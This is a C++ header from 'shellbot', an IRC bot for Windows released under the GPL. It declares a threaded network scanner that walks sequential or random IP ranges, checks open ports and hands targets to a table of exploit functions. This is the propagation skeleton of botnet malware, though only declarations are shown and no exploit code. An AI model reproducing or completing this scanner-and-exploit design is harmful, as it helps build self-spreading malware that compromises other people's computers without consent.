/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vInclude.h"
#include "CThread.h"



typedef struct Scan
{
	char ip[16];
	char target[128];
	unsigned int port;
	unsigned int delay;
	unsigned int threadnum;
	unsigned int cthreadnum;
	unsigned int cthreadid;
	unsigned int threads;
	int exploit;
	bool silent;
	bool verbose;
	bool random;
} Scan;

typedef struct ScanInfo
{
	unsigned long ip;
	bool info;
} ScanInfo;

typedef struct TargetInfo {
	char ip[16];
	string command;
	unsigned int port;
	unsigned int threadnum;
	int exploit;
	bool silent;
	bool verbose;
} TargetInfo;

typedef bool (*efref)(TargetInfo tInfo);

typedef struct ExplInfo 
{
	char command[MAX_COMMANDLEN];
	char name[30];
	unsigned int port;
	efref exfunc;
	unsigned int stats;
} ExplInfo;

class CScanner : public CThread {
public:
	static CScanner main;
	virtual void *Run();
	void Init();
	void Stop();

	static void TCPConnectScanner();
	
	string InternalIp();

	unsigned long SequentialNextIP(string sIp);
	bool ConnectPortOpen(unsigned long sIp, unsigned int sPort);
	USHORT Checksum(USHORT *buffer, int size);
	string RandomNextIP(string scanIp);
	string ExtractRange(string sLocalIp);
	string makeIP(string ip, bool random, int Class);

	TargetInfo tInfo;

	string sLocalHost;
	string sExternalHost;
	bool bRunning;
	string scanType;
	string scanRange;
	string scanDuration;
	string scanExploit;
	int scanIndex;
	int scanDelay;
	int scanThreads;
	unsigned int scanPort;
};


extern ExplInfo exploit[];